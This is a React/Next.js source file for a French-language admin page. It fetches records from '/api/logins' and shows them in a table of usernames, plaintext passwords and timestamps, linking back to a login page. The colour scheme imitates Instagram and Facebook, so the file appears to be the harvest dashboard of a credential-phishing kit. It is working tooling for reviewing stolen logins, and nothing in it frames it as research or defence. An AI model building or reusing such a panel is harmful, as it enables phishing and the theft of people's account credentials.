"use client";

import { useState, useEffect } from "react";

export default function Admin() {
  const [logins, setLogins] = useState([]);
  const [loading, setLoading] = useState(true);

  const fetchLogins = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/logins");
      const data = await res.json();
      if (data.success) {
        setLogins(data.logins);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchLogins();
  }, []);

  return (
    <div className="min-h-screen bg-gray-50 px-4 py-8">
      <div className="mx-auto max-w-2xl">
        {/* Header */}
        <div className="mb-6 flex items-center justify-between">
          <h1 className="text-xl font-bold text-gray-900">
            Données de connexion
          </h1>
          <button
            onClick={fetchLogins}
            className="rounded-lg bg-[#0095f6] px-4 py-2 text-sm font-semibold text-white hover:bg-[#1877f2] transition-colors"
          >
            Rafraîchir
          </button>
        </div>

        {/* Count */}
        <p className="mb-4 text-sm text-gray-500">
          {logins.length} connexion{logins.length !== 1 ? "s" : ""} enregistrée{logins.length !== 1 ? "s" : ""}
        </p>

        {/* Table */}
        {loading ? (
          <p className="text-center text-gray-400">Chargement...</p>
        ) : logins.length === 0 ? (
          <p className="text-center text-gray-400">Aucune donnée</p>
        ) : (
          <div className="overflow-hidden rounded-xl border border-gray-200 bg-white shadow-sm">
            <table className="w-full text-left text-sm">
              <thead className="border-b border-gray-200 bg-gray-50">
                <tr>
                  <th className="px-4 py-3 font-semibold text-gray-600">#</th>
                  <th className="px-4 py-3 font-semibold text-gray-600">Utilisateur</th>
                  <th className="px-4 py-3 font-semibold text-gray-600">Mot de passe</th>
                  <th className="px-4 py-3 font-semibold text-gray-600">Date</th>
                </tr>
              </thead>
              <tbody>
                {logins.map((login, index) => (
                  <tr
                    key={index}
                    className="border-b border-gray-100 last:border-0 hover:bg-gray-50"
                  >
                    <td className="px-4 py-3 text-gray-400">{index + 1}</td>
                    <td className="px-4 py-3 font-medium text-gray-900">
                      {login.username}
                    </td>
                    <td className="px-4 py-3 text-gray-700">{login.password}</td>
                    <td className="px-4 py-3 text-gray-500">
                      {new Date(login.date).toLocaleString("fr-FR")}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* Back link */}
        <div className="mt-6 text-center">
          <a href="/" className="text-sm text-[#0095f6] hover:underline">
            Retour à la page de connexion
          </a>
        </div>
      </div>
    </div>
  );
}
